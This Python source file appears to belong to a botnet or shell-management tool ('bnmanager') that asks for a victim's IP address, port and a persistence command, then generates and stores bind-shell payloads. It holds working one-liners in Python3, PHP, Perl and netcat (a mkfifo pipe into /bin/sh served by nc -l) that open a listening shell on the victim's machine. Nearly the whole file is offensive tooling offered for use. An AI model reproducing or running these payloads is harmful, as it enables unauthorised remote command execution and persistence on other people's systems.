from termcolor import cprint
from os import system
import sqlite3
import datetime


def exit_function():
    cprint("Exiting manager... See you soon!", "green", attrs=["bold"])
    exit(0)


def bind_botSelector_help():
    cprint("\nHelp Menu for Creating a Bind shell\n", attrs=["bold"])
    cprint("help\t\t", attrs=["bold"], end="")
    cprint("Displays this menu")
    cprint("start\t\t", attrs=["bold"], end="")
    cprint("Start creating bind shell")
    cprint("back\t\t", attrs=["bold"], end="")
    cprint("For going back to previous module")
    cprint("exit\t\t", attrs=["bold"], end="")
    cprint("For Exiting the Manager")
    return 0


def bind_botSelector_start():

    try:
        cprint("BindShell> ", "green", attrs=["bold"], end="")
        cprint("Enter victim's IP Address/HostName.", attrs=["bold"])
        cprint("BindShell> ", "green", attrs=["bold"], end="")

        user_input = input().lower()
        if user_input == "":
            print("Invalid input")
            return 0

        host = user_input
        # if not supporting_utility.ping(user_input):
        #    cprint("Victim host isn't reachable, make sure the connectivity before connecting to the host", "yellow")

        cprint("BindShell> ", "green", attrs=["bold"], end="")
        cprint("Enter victim's port number to build connection on.", attrs=["bold"])
        cprint("BindShell> ", "green", attrs=["bold"], end="")

        user_input = input()
        if user_input == "":
            print("Invalid input")
            return 0
        if not user_input.isnumeric():
            print("Invalid input")
            return 0
        port = user_input

        cprint("BindShell> ", "green", attrs=["bold"], end="")
        cprint(
            "Enter command to execute once connection is being established. Mainly a bash command for persistance.",
            attrs=["bold"],
        )
        cprint("BindShell> ", "green", attrs=["bold"], end="")
        pre_payload = input()
        pre_payload=pre_payload+" > /dev/null"
        cprint("\nSelect the type of payload you want", attrs=["bold"])
        cprint(
            """1. Python3
2. PHP
3. NetCat
4. Perl"""
        )

        cprint("BindShell> ", "green", attrs=["bold"], end="")
        user_input = input().lower()

        if user_input == "1":
            bind_python3(port, pre_payload, host)
        elif user_input == "2":
            bind_php(port, pre_payload, host)
        elif user_input == "3":
            bind_nc(port, pre_payload, host)
        elif user_input == "4":
            bind_perl(port, pre_payload, host)
        elif user_input == "back":
            return 0
        elif user_input == "exit":
            exit_function()
        else:
            cprint("Invalid Input! Exiting shell creating mode", "yellow")
            return 0
    except KeyboardInterrupt:
        cprint("Exiting shell creating mode...\n", "yellow")
        return 0


def bot_selector():
    while True:
        cprint("bnmanager/CreateBot/bind> ", "red", attrs=["bold"], end="")
        try:
            user_input = input().lower()
        except KeyboardInterrupt:
            cprint(
                "Ctrl+C is disabled. You can either \'back\' or \'exit\' instead. Type 'help for more info.",
                "yellow",
            )
            continue
        if user_input == "help":
            bind_botSelector_help()
        elif user_input == "start":
            bind_botSelector_start()
        elif user_input == "back":
            return 0
        elif user_input == "exit":
            exit_function()
        else:
            cprint("Invalid Input, type \'help\' for help menu", "yellow")


def bind_python3(port: int, initial_command, host):
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """python3 -c \'import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{0}));s1.listen(1);c,a=s1.accept();c.sendall(sp.Popen(\"{1}\",shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE).stdout.read()+sp.Popen(\"{1}\",shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE).stderr.read());exec(\"while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\")\'"""
    pay = pay.format(port, initial_command)
    print("Here's your payload\n\n", pay, "\n\n")
    bind_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def bind_php(port: int, initial_command, host):
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """<?php $h = popen("{1}", "r"); while (!feof($h)) echo fgetc($h); for ($s = socket_create(2, 1, 6), socket_bind($s, "0.0.0.0", {0}), socket_listen($s, 1), $c = socket_accept($s); 1; socket_write($c, "$ ", 2), !socket_write($c, popen(socket_read($c, 100), "r") ?: ''))?>"""
    pay = pay.format(port, initial_command)
    print("Here's your payload\n\n", pay, "\n\n")
    bind_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def bind_nc(port: int, initial_command, host):
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """ (rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {0} > /tmp/f) &"""
    pay = pay.format(port, initial_command)
    print("Here's your payload\n\n", pay)
    cprint(
        "Alert! persistance command won't work in this payload. You may use other payloads for executing the persistance command. Our run it manually after connection",
        "yellow",
        attrs=["bold"],
    )

    bind_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def bind_perl(port: int, initial_command, host):
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("BindShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = f"""perl -e 'use Socket;$p=shift||{port};system("echo '{initial_command}'");socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}};' {port}"""
    print("Here's your payload\n\n", pay, "\n\n")
    bind_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def bind_in_db(name, pay, host, port, initital_command, timestamp):
    query = "INSERT INTO BIND (pay_name,payload,host,port,persistence_command,timestamp) VALUES(?,?,?,?,?,?)"
    tup = (name, pay, host, port, initital_command, timestamp)
    cursor = sqlite3.connect('bnmanager.sqlite')
    sql = cursor.cursor()
    sql.execute(query, tup)
    cursor.commit()
    sql.close()
